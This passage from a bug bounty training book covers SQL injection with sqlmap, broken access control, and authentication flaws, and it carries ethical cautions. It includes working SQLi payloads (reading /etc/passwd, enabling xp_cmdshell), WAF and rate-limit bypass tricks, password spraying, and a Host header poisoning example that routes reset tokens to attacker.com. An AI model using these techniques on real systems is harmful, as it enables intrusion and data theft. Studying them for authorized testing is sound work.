**Important:** Always use sqlmap with a low request rate on live targets. Obtain a session cookie for authenticated testing. Never run `--dump-all` on production databases — stop after confirming the vulnerability.

### Basic Usage

```bash
# Test a GET parameter
sqlmap -u "https://example.com/products?id=1"

# Test a specific parameter
sqlmap -u "https://example.com/products?id=1&category=shoes" -p id

# Test a POST request (use Burp "Save item" to get the raw request file)
sqlmap -r request.txt

# Test with session cookie (authenticated testing)
sqlmap -u "https://example.com/profile?id=1" \
  --cookie="session=abc123def456"

# Test a JSON parameter
sqlmap -u "https://api.example.com/users" \
  --data='{"id": "1"}' \
  --method=POST \
  --headers="Content-Type: application/json"
```

### Specifying the DBMS

```bash
# If you already know the DBMS (speeds up testing)
sqlmap -u "https://example.com/id=1" --dbms=mysql
sqlmap -u "https://example.com/id=1" --dbms=postgresql
sqlmap -u "https://example.com/id=1" --dbms=mssql
```

### Enumerating Database Structure

```bash
# Get current database name
sqlmap -u "https://example.com/id=1" --current-db

# List all databases
sqlmap -u "https://example.com/id=1" --dbs

# List tables in a specific database
sqlmap -u "https://example.com/id=1" -D target_db --tables

# List columns in a specific table
sqlmap -u "https://example.com/id=1" -D target_db -T users --columns

# Dump specific columns (for proof of concept — stop here in bug bounty)
sqlmap -u "https://example.com/id=1" -D target_db -T users -C "username,email" --dump
# Dump ONLY enough to prove the vulnerability. Never dump the entire database.
```

### Bypass Techniques

```bash
# Use tamper scripts to bypass WAFs and filters
sqlmap -u "https://example.com/id=1" --tamper=space2comment

# Common tamper scripts
# space2comment     → replaces spaces with /**/ (bypass WAF space filters)
# between           → replaces > with BETWEEN x AND y
# randomcase        → randomly changes case: SeLeCt InStEaD oF SELECT
# charencode        → URL-encodes characters
# base64encode      → base64-encodes the payload
# equaltolike       → replaces = with LIKE

# Multiple tampers
sqlmap -u "https://example.com/id=1" --tamper=space2comment,randomcase

# Adjust level and risk (higher = more aggressive = more detection risk)
# Level 1-5 (default 1): controls which parameters are tested
# Risk 1-3 (default 1): controls which payloads are tried (3 may modify data)
sqlmap -u "https://example.com/id=1" --level=3 --risk=2

# Set custom delay to avoid rate limiting
sqlmap -u "https://example.com/id=1" --delay=2

# Route through Burp for monitoring
sqlmap -u "https://example.com/id=1" --proxy=http://127.0.0.1:8080
```

---

## Common Payloads Reference

### MySQL

```sql
-- Version
SELECT version()
SELECT @@version

-- Current database
SELECT database()

-- List databases
SELECT group_concat(schema_name) FROM information_schema.schemata

-- List tables
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()

-- List columns
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'

-- Dump data
SELECT concat(username,':',password) FROM users

-- Read a file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd')

-- Comment syntax
--       (space after required in some contexts)
#        (alternative for MySQL)
/**/     (C-style comment)
```

### PostgreSQL

```sql
-- Version
SELECT version()

-- Current database
SELECT current_database()

-- List databases
SELECT string_agg(datname,',') FROM pg_database

-- List tables
SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'

-- List columns
SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'

-- Dump data
SELECT username||':'||password FROM users

-- Read a file (superuser only)
SELECT pg_read_file('/etc/passwd')

-- Time-based
SELECT pg_sleep(5)

-- Comment
--       (double dash + space)
```

### Microsoft SQL Server

```sql
-- Version
SELECT @@version

-- Current database
SELECT DB_NAME()

-- List databases
SELECT STRING_AGG(name,',') FROM master.dbo.sysdatabases

-- List tables
SELECT STRING_AGG(table_name,',') FROM information_schema.tables

-- List columns
SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='users'

-- Time-based delay
WAITFOR DELAY '0:0:5'

-- Enable xp_cmdshell (requires sysadmin — very high privilege)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

---

## Demonstrating Impact

In bug bounty, the goal is to prove the vulnerability exists without causing harm or extracting real user data.

**Appropriate proof of concept:**

```sql
-- Show database version (proves code execution, no data exposure)
' UNION SELECT NULL,version(),NULL--

-- Show current database name
' UNION SELECT NULL,database(),NULL--

-- Show the number of tables (proves access without reading data)
' UNION SELECT NULL,(SELECT count(*) FROM information_schema.tables WHERE table_schema=database()),NULL--

-- Show table names (structural metadata — not personal data)
' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
```

**Stop before:**

- Dumping actual usernames, emails, or passwords
- Reading files from the server
- Writing files to the server
- Executing OS commands (even via stacked queries)

**For your bug report:**

1. The vulnerable URL and parameter
2. The exact payload used
3. The response showing database metadata (version, database name, table count)
4. The estimated impact (how many records are at risk, what types of data)
5. The DBMS identified

---

## Filter and WAF Bypass Techniques

When basic payloads are blocked:

```sql
-- Case variation (SQL keywords are case-insensitive)
sElEcT vErSiOn()
UNION/**/SELECT/**/version()

-- Comment-based obfuscation
UN/**/ION SE/**/LECT version()
/*!UNION*/ /*!SELECT*/ version()

-- URL encoding
%27 = '
%20 = space
%23 = #

-- Double URL encoding (if the WAF decodes once)
%2527 = %27 = '

-- Whitespace alternatives
UNION%09SELECT    (tab instead of space)
UNION%0ASELECT    (newline)
UNION%0DSELECT    (carriage return)

-- Keyword alternatives
-- INFORMATION_SCHEMA alternatives in MySQL:
-- sys.schema_tables
-- mysql.innodb_table_stats

-- If SLEEP is blocked (MySQL alternatives):
BENCHMARK(10000000,MD5('test'))
```

---

## Second-Order Testing Checklist

Second-order injection is easy to miss. After finding standard injection is blocked or not present:

1. Register an account with a SQLi payload as the username: `admin'--`
2. Log in as that account
3. Visit every feature that uses your username server-side:
    - Profile page
    - Password change ("WHERE username = YOUR_STORED_VALUE")
    - Account deletion
    - Admin user lookup (if admin can search by username)
4. Look for errors or behavioral differences that indicate the stored payload is now executing

---

## Summary

SQL injection allows attackers to manipulate database queries by injecting SQL code into user-controlled input. It occurs when applications concatenate user input directly into SQL strings without parameterization. The five main types are error-based, union-based, boolean-based blind, time-based blind, and out-of-band. Union-based is the most efficient when available. Boolean-based and time-based work when no output is returned. sqlmap automates detection and enumeration — but must be rate-limited and stopped at structural metadata in bug bounty contexts. Second-order injection is a commonly missed variant where stored data is used unsafely later. SQLi severity is typically Critical when it provides unauthenticated access to user data.

---

## Checklist

- [ ] Identified all URL parameters, POST body fields, headers, and JSON values that interact with the database
- [ ] Sent a single quote `'` to each parameter — noted any SQL errors or behavioral changes
- [ ] Tested boolean-based detection: `AND 1=1` vs `AND 1=2` — noted response differences
- [ ] Tested time-based detection: `AND SLEEP(5)` — measured response delay
- [ ] Determined the injection type (error-based, union, boolean-blind, time-blind)
- [ ] Identified the number of columns using `ORDER BY` or `UNION SELECT NULL` padding
- [ ] Identified which columns are displayed using string markers (`'TEST'`)
- [ ] Extracted the DBMS version and database name
- [ ] Listed table names from information_schema (structural data only)
- [ ] Stopped extraction at structural metadata — did not dump actual user data
- [ ] Ran sqlmap with a session cookie for authenticated endpoints
- [ ] Used `--delay` or `--level 1` to avoid aggressive scanning
- [ ] Tested search fields, sort parameters, and filter dropdowns (commonly overlooked)
- [ ] Checked for second-order injection in stored profile fields
- [ ] Tested HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For` (if reflected into queries)
- [ ] Documented the vulnerable parameter, payload, DBMS, and database name in the report
- [ ] Did not execute OS commands or read server files without explicit program permission

---

# Chapter 17: Broken Access Control

## Objective

Understand what access control is, why it fails, and how to systematically identify and exploit broken access control vulnerabilities — one of the most consistently prevalent vulnerability classes across all web applications.

## Prerequisites

Chapters 1–16 complete. You should be comfortable navigating web applications in Burp Suite, understanding HTTP requests and responses, and reading basic application logic.

## Terminology

|Term|Definition|
|---|---|
|**Access Control**|Rules that determine which users can access which resources or perform which actions|
|**Authorization**|The process of verifying that a user has permission to perform an action (distinct from authentication, which verifies _who_ they are)|
|**IDOR**|Insecure Direct Object Reference — a subtype where object identifiers can be manipulated to access unauthorized resources|
|**Horizontal Privilege Escalation**|Accessing another user's resources at the same privilege level (e.g., user A accessing user B's data)|
|**Vertical Privilege Escalation**|Gaining higher privileges than you are authorized for (e.g., a regular user accessing admin functions)|
|**Forced Browsing**|Directly navigating to URLs or endpoints that are not linked in the UI but exist on the server|
|**RBAC**|Role-Based Access Control — a model where access is granted based on a user's role|
|**Parameter Tampering**|Modifying request parameters to gain unauthorized access|
|**Mass Assignment**|A vulnerability where a server accepts user-supplied fields that should not be user-controllable (e.g., `role`, `isAdmin`)|

---

## Theory

### What Is Access Control?

Access control is the set of rules and mechanisms a web application uses to enforce what users can do and what data they can see. Every web application has at minimum two levels of access: unauthenticated (not logged in) and authenticated (logged in). Most have many more: regular user, premium user, moderator, admin, super-admin, and so on.

Access control is how the application ensures that:

- Users can only see their own data, not other users' data
- Regular users cannot access admin panels
- Read-only users cannot delete records
- Unauthenticated visitors cannot access content behind a login wall

When access control is broken, these guarantees fail. An attacker can see data that is not theirs, perform actions they are not authorized to perform, or elevate their privileges.

### Why Does Access Control Break?

Access control failures are **#1 in the OWASP Top 10** — not because they are technically complex, but because they are easy to get wrong at scale.

A web application might have hundreds of endpoints. Developers must implement correct authorization checks on every single one. Missing even one creates a vulnerability. Common reasons access control fails:

1. **Developers trust the UI.** They hide a "Delete User" button from non-admins but forget to protect the API endpoint the button calls. An attacker simply calls the endpoint directly.
2. **Enforcement is done client-side.** JavaScript hides admin features, but the server does not verify the user's role — it just serves whatever is requested.
3. **Object references are predictable.** User accounts are at `/account/1001`, `/account/1002`, etc. There is no check that the authenticated user owns the account they are requesting.
4. **Developers forget about indirect paths.** The main `/admin` route checks for admin role. But `/admin/export` was added later and the check was forgotten.
5. **HTTP methods are not locked down.** The application correctly refuses a `DELETE` request from a regular user but does not account for the fact that a `POST` to the same endpoint achieves the same effect.

### The Two Types of Broken Access Control

#### Horizontal Privilege Escalation

Accessing resources that belong to another user at the _same_ privilege level.

**Example:** You are logged in as User A. You can view your own profile at `/profile?id=4521`. You change the `id` parameter to `4522` and see User B's private profile. Both users have the same role (regular user), but you accessed data you were not authorized to access.

This is the classic IDOR pattern (covered in depth in Chapter 20). However, IDOR is a specific subtype of broken access control. Horizontal escalation includes many more scenarios than just object ID manipulation.

#### Vertical Privilege Escalation

Gaining access to functions or data reserved for higher-privilege roles.

**Example:** You are a regular user. The admin panel is at `/admin/dashboard`. You navigate directly to it and — because the server does not verify your role — you are shown the full admin interface.

### Access Control in Real Applications

Real applications enforce access control in several ways. Understanding these is essential to knowing where to look for failures.

**Route-Level Middleware**

Frameworks like Express (Node.js), Django (Python), and Laravel (PHP) let developers attach middleware to routes. The middleware runs before the route handler and checks the user's authentication and role.

```
GET /admin/users
  → run isAuthenticated() middleware → run isAdmin() middleware → handle request
```

If the middleware is missing from a route, the check never runs.

**Object-Level Authorization**

When a user requests a specific object (a document, an order, a message), the application should verify that the user owns or has permission to access that object.

```
GET /api/orders/8841
  → verify user is authenticated
  → verify order 8841 belongs to this user
  → return order
```

If step 2 is missing, any authenticated user can access any order.

**Function-Level Authorization**

Before executing a sensitive action (delete a user, change a role, export data), the application should verify the user has permission to perform that specific action.

```
POST /api/users/4521/delete
  → verify user is authenticated
  → verify user has DELETE_USER permission
  → execute deletion
```

If step 2 is missing, any authenticated user can delete any user.

---

## How to Test for Broken Access Control

### Step 1: Map the Application's Access Control Model

Before you start attacking, understand how the application is supposed to work. Ask yourself:

- What roles exist? (guest, user, admin, moderator, etc.)
- What can each role do?
- What data is private to each user?
- What actions are restricted to admins?

You can learn this by reading the program's feature documentation, exploring the UI as multiple user types, and observing every request Burp Suite captures.

### Step 2: Create Multiple Test Accounts

You need at least two accounts at each privilege level to test properly.

- **Account A** (regular user): your primary testing account
- **Account B** (regular user): your victim account — to test horizontal escalation
- **Account C** (admin, if available): to understand what admin functions look like

Some programs provide a test admin account. If not, you can often infer admin functionality from JavaScript files, API documentation, or HTML source comments.

### Step 3: Test Unauthenticated Access

Log out completely. Attempt to access every endpoint you discovered while authenticated. Use Burp's session handling rules or compare responses with and without a valid session cookie.

Common places to find unauthenticated access bugs:

- API endpoints (especially `/api/v1/...` routes)
- Static files that should be private (e.g., `/reports/quarterly-financials.pdf`)
- Admin functions on alternate ports or subdomains
- Password reset flows that expose tokens in responses
- Webhook or callback endpoints

### Step 4: Test Horizontal Privilege Escalation

Logged in as Account A, systematically replace your user identifiers with Account B's identifiers in every request.

**Identifiers to look for:**

- User ID in the URL: `/profile/4521` → try `/profile/4522`
- User ID in parameters: `?user_id=4521` → try `?user_id=4522`
- User ID in the request body: `{"userId": "4521"}` → try `{"userId": "4522"}`
- Object IDs belonging to the user: order IDs, document IDs, message IDs, ticket IDs

**What to test for each:**

- Can you read Account B's private data?
- Can you modify Account B's data?
- Can you delete Account B's data?
- Can you perform actions on Account B's behalf?

### Step 5: Test Vertical Privilege Escalation

Logged in as a regular user, attempt to access admin or elevated functionality.

**Forced browsing — admin routes to try:**

```
/admin
/admin/dashboard
/admin/users
/admin/settings
/admin/logs
/admin/export
/administrator
/manage
/management
/console
/control
/panel
/superadmin
/moderator
/staff
/internal
```

These are often protected by login checks but not by role checks. If you are authenticated as any user, the server may serve the admin panel.

**API endpoint testing:**

Admin actions are often exposed via API endpoints. Look for these in JavaScript files, network requests captured in Burp, and API documentation:

```
GET  /api/admin/users
POST /api/admin/users/delete
GET  /api/users?role=admin
POST /api/roles/assign
GET  /api/internal/debug
DELETE /api/users/{id}
```

Try calling these endpoints with your regular user's session token. A 200 response when you expected a 403 is a vulnerability.

**Parameter-based role escalation (Mass Assignment):**

Some poorly designed applications include role information in the request itself:

```http
POST /api/profile/update
Content-Type: application/json

{"username": "alice", "email": "alice@example.com", "role": "user"}
```

Try changing `"role": "user"` to `"role": "admin"` and observe whether the server accepts the change. Also try adding fields that were not in the original request:

```json
{"username": "alice", "email": "alice@example.com", "isAdmin": true, "verified": true}
```

### Step 6: Test HTTP Method Substitution

Many frameworks apply access control based on both the route AND the HTTP method. If the control is only implemented for some methods, other methods may bypass it.

Test every protected endpoint with alternate HTTP methods:

```
# Original (blocked):
DELETE /api/users/4522

# Try these alternatives:
GET    /api/users/4522/delete
POST   /api/users/4522/delete
PUT    /api/users/4522
PATCH  /api/users/4522
```

Also test with uncommon but valid HTTP methods:

```
HEAD    /admin/users
OPTIONS /admin/users
TRACE   /admin/users
```

### Step 7: Test Path Traversal in Routes

Some frameworks match routes with patterns. If the pattern is too permissive, you can bypass access checks with path manipulation:

```
# Blocked:
/admin/users

# Try these variations:
/admin/users/
/admin//users
/ADMIN/users
/Admin/Users
/admin/./users
/admin/%2fusers
/admin/users%20
/admin;/users
```

### Step 8: Test Multi-Step Workflows

Access control must be enforced at every step of a multi-step process — not just the first one.

Example — an e-commerce checkout flow:

1. Add items to cart
2. Enter shipping information
3. Enter payment information
4. Confirm order

If access control is only checked at step 1, you can reach step 3 by navigating directly to it, potentially accessing payment processing functionality without proper authorization.

**Test by:**

- Starting a multi-step process and capturing the URL or request for each step
- Attempting to skip to later steps directly without completing earlier ones
- Attempting to access another user's in-progress workflow using their object ID

---

## Common Vulnerability Patterns

### Pattern 1: Missing Function-Level Access Control

The UI hides a button. The server does not check the user's role when the corresponding API endpoint is called.

**How to find it:** Look at every API call made when you perform an action as an admin. Then replay those API calls using a regular user's session token.

### Pattern 2: GUID vs. Sequential ID

Applications sometimes use GUIDs (e.g., `a3f2c891-44f1-4b9e-bcc3-12ef44ac2f71`) instead of sequential integers, believing these are impossible to guess. This does not make the endpoint secure — it only makes it harder to enumerate.

**How to find it:** Capture GUIDs from API responses (e.g., another user's GUID appearing in a shared resource or notification). Then use that GUID to access the resource directly.

### Pattern 3: Referrer-Based Access Control

Some applications check the `Referer` header to determine if a user navigated through the proper flow. This is trivially bypassable.

```http
GET /admin/users HTTP/1.1
Host: target.com
Referer: https://target.com/admin/dashboard
Cookie: session=regularuser_token
```

**How to find it:** Add a `Referer` header matching an admin URL when accessing a protected endpoint as a regular user.

### Pattern 4: Cookie or Parameter Contains Role

The role is stored in a client-controlled location (cookie, hidden form field, JWT without proper signing).

```
Cookie: role=user; session=abc123
```

**How to find it:** Look for any cookie, header, or parameter that contains a role or privilege indicator. Attempt to modify it.

### Pattern 5: API v1 vs v2 Discrepancy

The application upgraded from v1 to v2 and added access controls to v2 endpoints. The v1 endpoints still exist and lack controls.

```
# v2 — protected:
GET /api/v2/users/4522/profile → 403 Forbidden

# v1 — unprotected:
GET /api/v1/users/4522/profile → 200 OK (full profile returned)
```

**How to find it:** For every endpoint you find, try alternate version prefixes: `/v1/`, `/v2/`, `/v0/`, `/legacy/`, `/old/`.

---

## Exploitation Examples

### Example 1: Accessing Another User's Invoice

**Setup:** You are logged in as user 4521. You requested your own invoice:

```http
GET /api/invoices/88413 HTTP/1.1
Host: target.com
Cookie: session=USER_4521_TOKEN
```

**Test:** Replace `88413` with invoice IDs belonging to other users. Find these IDs by observing your own invoice IDs (sequential integers suggest others exist), checking email notifications that may contain invoice numbers, or enumerating.

**Vulnerability confirmed:** The server returns invoice data for another user without checking that the requesting user owns that invoice.

### Example 2: Admin Panel Access via Forced Browsing

**Setup:** You are logged in as a regular user. The admin dashboard is at `/admin`.

**Test:**

```http
GET /admin/users HTTP/1.1
Host: target.com
Cookie: session=REGULAR_USER_TOKEN
```

**Vulnerability confirmed:** The server returns the admin user management page instead of returning a 403 Forbidden response.

### Example 3: Privilege Escalation via Mass Assignment

**Setup:** The profile update endpoint is:

```http
POST /api/profile HTTP/1.1
Content-Type: application/json
Cookie: session=REGULAR_USER_TOKEN

{"display_name": "Alice"}
```

**Test:** Add extra fields:

```http
POST /api/profile HTTP/1.1
Content-Type: application/json
Cookie: session=REGULAR_USER_TOKEN

{"display_name": "Alice", "role": "admin", "is_verified": true, "account_type": "premium"}
```

**Vulnerability confirmed:** The server accepts the `role` field and updates the user's role to admin.

---

## Burp Suite Workflow

### Setting Up Multi-Account Testing

1. Open Burp Suite → Proxy → Options
2. Enable **"Match and Replace"** to quickly swap session tokens
3. Alternatively, use **Burp's Session Handling Rules** to maintain two separate sessions simultaneously

### Using Burp Repeater for Access Control Testing

1. Capture a request in Proxy
2. Send to Repeater (Ctrl+R)
3. Modify the session cookie to Account B's token
4. Observe the response — a 200 with data when you expected a 403 is a finding

### Using Burp Intruder for Enumeration

1. Capture a request to a resource endpoint: `GET /api/documents/§1001§`
2. Send to Intruder
3. Set the payload to a sequential number list (1000–2000)
4. Run the attack
5. Filter results by response length — resources you own will have one response length, unauthorized ones (if the access control is broken) will have another

---

## Impact Assessment

Broken access control can range from low to critical severity depending on what data or functionality is exposed.

|Scenario|Typical Severity|
|---|---|
|Reading another user's non-sensitive public profile|Low|
|Reading another user's private messages|High|
|Reading another user's financial data|High to Critical|
|Accessing admin panel (read-only)|High|
|Accessing admin panel (write/delete)|Critical|
|Deleting or modifying all user data|Critical|
|Account takeover via access control|Critical|

When writing your report, always demonstrate the _worst-case impact_ a real attacker could achieve, not just what you tested.

---

## Practice Labs

1. **PortSwigger Web Security Academy** — Access Control Labs: practitioner.portswigger.net/web-security/access-control. Complete all labs in this module. They are among the best hands-on exercises for this topic.
2. **DVWA (Damn Vulnerable Web Application)** — set up locally and practice the IDOR and access control exercises at different difficulty levels.
3. **HackTheBox** — search for retired machines tagged with "access control" or "IDOR" to practice in a realistic environment.

---

## References

- OWASP Top 10 A01: Broken Access Control — owasp.org/Top10/A01_2021-Broken_Access_Control
- OWASP Testing Guide — Access Control Testing — owasp.org/www-project-web-security-testing-guide
- PortSwigger Access Control Labs — portswigger.net/web-security/access-control
- HackerOne Hacktivity — search "IDOR" and "access control" for real disclosed reports

---

## Summary

Broken access control occurs when an application fails to properly enforce what authenticated users are allowed to do and access. It is the single most common vulnerability class in web applications and is consistently ranked #1 by OWASP.

There are two primary categories: horizontal privilege escalation (accessing another user's data at the same privilege level) and vertical privilege escalation (accessing functionality reserved for higher-privilege roles). Testing requires multiple accounts, systematic enumeration of endpoints, parameter tampering, HTTP method substitution, forced browsing of admin routes, and attention to multi-step workflow logic.

The impact ranges from minor (reading public profile fields) to critical (admin panel takeover, mass data exfiltration, or complete account compromise).

---

## Checklist

- [ ] Created at least two regular user accounts and one admin account (if available) for testing
- [ ] Mapped the application's intended access control model (roles and permissions)
- [ ] Tested all endpoints for unauthenticated access (logged-out session)
- [ ] Tested horizontal escalation: replaced own object IDs with other users' IDs across all endpoints
- [ ] Tested vertical escalation: attempted to access admin routes and API endpoints as a regular user
- [ ] Tested HTTP method substitution on all protected endpoints
- [ ] Tested for mass assignment: added extra fields (role, isAdmin) to all write requests
- [ ] Tested for API version discrepancies (v1 vs v2 endpoint sets)
- [ ] Tested multi-step workflows for step-skipping and cross-user access
- [ ] Tested path normalization bypasses on protected routes
- [ ] Documented any confirmed finding with a full reproduction path and impact statement

---

> _"Access control is only as strong as the endpoint with the missing check."_ — Field Wisdom

---
# Chapter 18: Authentication Vulnerabilities

## Objective

Understand every way authentication mechanisms can fail — from weak password policies and broken login logic, to flawed password reset flows, session management failures, and JWT vulnerabilities. Authentication is the gate to everything else; when it breaks, the consequences are severe.

## Prerequisites

Chapters 1–17 complete. Understand HTTP request/response, cookies, and basic JavaScript. Chapter 3 (HTTP) is especially relevant — session tokens are HTTP headers and cookies.

## Terminology

|Term|Definition|
|---|---|
|**Authentication**|Verifying the identity of a user (proving you are who you claim to be)|
|**Session**|A temporary relationship between a user and a server, maintained via a token|
|**Session Token**|A secret value (in a cookie or header) that identifies a logged-in session|
|**Cookie**|A key-value pair stored in the browser and sent with every request to the domain|
|**HttpOnly**|Cookie flag that prevents JavaScript from reading the cookie (XSS protection)|
|**Secure**|Cookie flag that only sends the cookie over HTTPS|
|**SameSite**|Cookie flag controlling cross-site cookie sending (CSRF protection)|
|**JWT**|JSON Web Token — a self-contained, signed token used for stateless authentication|
|**Brute Force**|Trying many passwords until one works|
|**Credential Stuffing**|Using leaked username/password pairs from other breaches|
|**Password Spraying**|Trying one common password against many accounts|
|**Rate Limiting**|Limiting the number of requests per time period to prevent brute force|
|**Account Lockout**|Temporarily or permanently disabling an account after too many failed attempts|
|**MFA**|Multi-Factor Authentication — requiring a second proof of identity|
|**TOTP**|Time-based One-Time Password — a rotating 6-digit code (e.g., Google Authenticator)|
|**OAuth**|An authorization framework that lets users grant third-party apps limited access|
|**Password Reset Token**|A temporary secret sent via email to allow password change|
|**Security Question**|A secondary authentication factor (often weak)|
|**Timing Attack**|Inferring information from how long an operation takes|
|**Session Fixation**|Forcing a victim to use a known session ID|

---

## Theory

### What Authentication Must Guarantee

A correct authentication system must:

1. **Prove identity reliably** — only the legitimate user can log in as themselves
2. **Issue secure session tokens** — unpredictable, unexploitable, properly scoped
3. **Expire sessions correctly** — logout invalidates the token server-side
4. **Protect the recovery flow** — password reset must be as secure as login
5. **Resist enumeration** — attacker cannot learn which usernames/emails exist

Every one of these properties can fail independently, and any failure creates a vulnerability.

---

## Category 1: Username Enumeration

Before brute-forcing, an attacker wants to know which usernames/emails exist. Poorly designed applications leak this through:

### Error Message Differences

```
POST /login
username=alice@test.com, password=wrongpass
→ Response: "Incorrect password"

POST /login
username=notexist@test.com, password=wrongpass
→ Response: "No account with that email"

The different messages reveal whether alice@test.com exists.
```

**Correct behavior:** Identical error messages regardless of whether the username exists: "Invalid credentials"

**Test:**

1. Submit a username you know exists (e.g., one you registered) with a wrong password
2. Submit a username that definitely does not exist with any password
3. Compare responses: status code, body content, response length, response time

### Response Time Differences

Some applications hash the password only if the username exists (to skip unnecessary computation). This creates a timing difference:

```
Existing user:   POST /login → 350ms (hashes the password)
Non-existing:    POST /login → 12ms (returns immediately)
```

Measure this with Burp Suite's Intruder using the "Response received" column or with a script.

### Registration Form

```
POST /register
email=alice@test.com
→ "An account with this email already exists"

This confirms alice@test.com is registered.
```

**Test:** Try registering with various email addresses. Different responses confirm/deny existence.

### Password Reset Form

```
POST /reset
email=alice@test.com
→ "Password reset link sent"

POST /reset
email=notexist@test.com
→ "No account found"
```

---

## Category 2: Brute Force and Rate Limiting

### Testing for Rate Limiting Absence

Send 20+ failed login attempts for a single account. If the account is not locked or responses not throttled, rate limiting is absent.

In Burp Intruder:

```
POST /login
username=admin@example.com&password=§PASSWORD§

Payload: password list (rockyou.txt top 100)
Attack type: Sniper
Thread count: 1 (to detect throttling accurately)
```

**Observe:**

- Do responses slow down? (throttling)
- Does the account lock? (lockout)
- Do CAPTCHAs appear? (bot detection)
- Does nothing change? (no protection — vulnerability confirmed)

### Rate Limit Bypass Techniques

When rate limits exist, test whether they can be bypassed:

```http
# IP rotation via headers (if server trusts these)
X-Forwarded-For: 1.1.1.1        # Change per request
X-Real-IP: 2.2.2.2
X-Originating-IP: 3.3.3.3
X-Remote-Addr: 4.4.4.4
True-Client-IP: 5.5.5.5

# Cluster bomb with IP header in Burp Intruder
# Position 1: §X-Forwarded-For: §RANDOM_IP§
# Position 2: password=§PASSWORD§

# Adding a null byte or space to the username
# Some rate limiters track by username exactly
username=admin          → blocked after 10 attempts
username=admin%00       → treated as different user by rate limiter, not by login logic
username=admin          → (with space after) same trick
```

### Account Lockout Logic Bypass

```
# If lockout is based on X failed attempts:

# Password spray: Try 1 password against many users
# Stays under the per-account threshold
POST /login (username=user1, password=Password1)
POST /login (username=user2, password=Password1)
POST /login (username=user3, password=Password1)
...

# Reset counter via successful login:
# Make 4 failed attempts
# Log in with correct credentials
# Counter resets → make 4 more failed attempts
# Repeat to brute force indefinitely
```

---

## Category 3: Password Reset Vulnerabilities

Password reset is often the weakest part of authentication. Many critical vulnerabilities live here.

### Token Predictability

Password reset tokens must be cryptographically random. Test for predictability:

1. Request a reset for your own account 5 times
2. Capture all 5 tokens
3. Look for patterns: sequential numbers, timestamps, base64 of username, MD5 of email

```
Token 1: resettoken_1704067200_alice@test.com  (timestamp + email → predictable)
Token 2: resettoken_1704067260_alice@test.com
Token 3: aGVsbG8=  (base64 "hello" → terrible)
Token 4: 5d41402abc4b2a76b9719d911017c592  (MD5 of "hello" → predictable)
```

**Good token:** 32+ bytes of cryptographic randomness: `f3a8b2c1d9e74f56a1b3c2d5e6f78901a2b3c4d5`

### Token Expiry

```
Step 1: Request a reset link for alice@test.com
Step 2: Wait 24 hours without clicking it
Step 3: Request a new reset link
Step 4: Try to use the FIRST (old) reset link

If the old link still works → tokens never expire → vulnerability
```

### Token in Referer Header Leak

When a user clicks the reset link, the URL contains the token: `https://example.com/reset?token=abc123`

If the reset page loads external resources (scripts, images, analytics), the browser sends the full URL in the `Referer` header to those external servers — leaking the token.

```
GET /reset?token=abc123 HTTP/1.1
Host: example.com
→ Loads Google Analytics
→ Google Analytics request:
   Referer: https://example.com/reset?token=abc123
```

The token is now in Google's logs.

**Test:** Use Burp to observe what external requests are made from the password reset page. Are they sent with a Referer header that includes the token?

### Host Header Injection (Password Reset Poisoning)

If the application uses the HTTP `Host` header to construct the reset link URL:

```http
POST /reset HTTP/1.1
Host: attacker.com              ← Poisoned Host header
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

The application might generate:

```
Reset link: https://attacker.com/reset?token=abc123
```

And email it to the victim. When the victim clicks the link, the request goes to `attacker.com`, revealing the token to the attacker.

**Test:**

1. Capture the password reset request in Burp
2. Change the `Host` header to a Burp Collaborator address or interactsh URL
3. Submit the request with a real email address (your test account)
4. Check if a DNS/HTTP hit arrives at your collaborator server with the reset token
5. If you control an account: check if the emailed link points to your poisoned host

### Security Questions

Security questions are inherently weak:

- Answers are often guessable or found on social media
- Questions are the same for all users → no brute force lockout on _question_ (only login)

**Test:** After failing the password, can you access the reset flow via security question? Try common answers: "london", "fluffy", "smith", "1990".

### No Current Password Required for Change

Some applications allow changing a password or email without verifying the current password. This means any XSS, CSRF, or session hijack leads to full account takeover.

```http
POST /account/change-email HTTP/1.1
Cookie: session=abc123

new_email=attacker@evil.com
# No current_password field
# No CSRF token
# → Vulnerable
```

---

## Category 4: Session Management Vulnerabilities

### Session Token Analysis

Inspect your session token carefully:

```
session=dXNlcl9pZD0xMjM0
→ base64 decode → user_id=1234
→ Trivially forgeable for any user ID
```

```
session=1234_admin_1704067200
→ Contains user ID, role, and timestamp in plaintext
→ Change role to "admin": 1234_admin_1704067200 → 1234_admin_1704067200
   (or change user ID: 9999_admin_1704067200)
```

Use Burp Suite's **Sequencer** to analyze session token randomness:

1. Capture a login response containing Set-Cookie
2. Right-click → Send to Sequencer
3. Configure the token location
4. Click "Start live capture" (generates 100+ tokens)
5. Click "Analyze now" — Burp shows the token's entropy

Low entropy = predictable = session forgery possible.

### Session Fixation

The attacker sets a victim's session ID to a known value before the victim logs in.

```
Step 1: Attacker gets a valid (unauthenticated) session ID from the application
        GET / HTTP/1.1 → Set-Cookie: session=ATTACKER_KNOWN_ID

Step 2: Attacker forces victim to use that session ID
        (e.g., via a link: https://example.com/?session=ATTACKER_KNOWN_ID
         or via XSS: document.cookie = "session=ATTACKER_KNOWN_ID")

Step 3: Victim logs in using the attacker's known session ID

Step 4: If the application does not issue a NEW session ID upon login,
        the attacker now knows the victim's authenticated session ID

Test: Check if a new Set-Cookie is issued upon successful login.
      If the same session ID is used before and after login → Session Fixation
```

### Session Non-Invalidation on Logout

```
Step 1: Log in → note your session token (e.g., from Burp)
Step 2: Click Logout
Step 3: In Burp, replay a request using the old session token
Step 4: If the server accepts the old token → logout doesn't invalidate the session
```

This means stolen session tokens remain valid even after the legitimate user has logged out.

### Cross-Site Requests with Session Tokens

Test whether session cookies have the `Secure`, `HttpOnly`, and `SameSite` flags:

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

Missing flags:

- No `HttpOnly` → JavaScript can read the cookie → XSS leads to session theft
